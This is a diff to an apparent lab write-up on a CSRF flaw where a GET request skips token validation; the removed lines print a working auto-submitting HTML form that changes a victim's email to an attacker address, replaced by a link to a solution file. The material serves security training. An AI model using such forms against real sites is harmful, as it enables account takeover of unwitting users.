@@ -23,20 +23,8 @@ to change the user's password, we instead use a GET request, and store the email
 URI. This means that the CSRF token is not validated, and the email address is changed when a user
 visits our exploit server.
 
-Below is the CSRF HTML payload we use to solve this lab:
 
-
-<html>
-  <body>
-    <form action="https://2.web-security-academy.net/my-account/change-email">
-      <input type="hidden" name="email" value="pwned&#64;evil&#45;user&#46;net" />
-    </form>
-    <script>
-      history.pushState('', '', '/');
-      document.forms[0].submit();
-    </script>
-  </body>
-</html>
+<a href="2.txt">Solution</a>
 
 
 
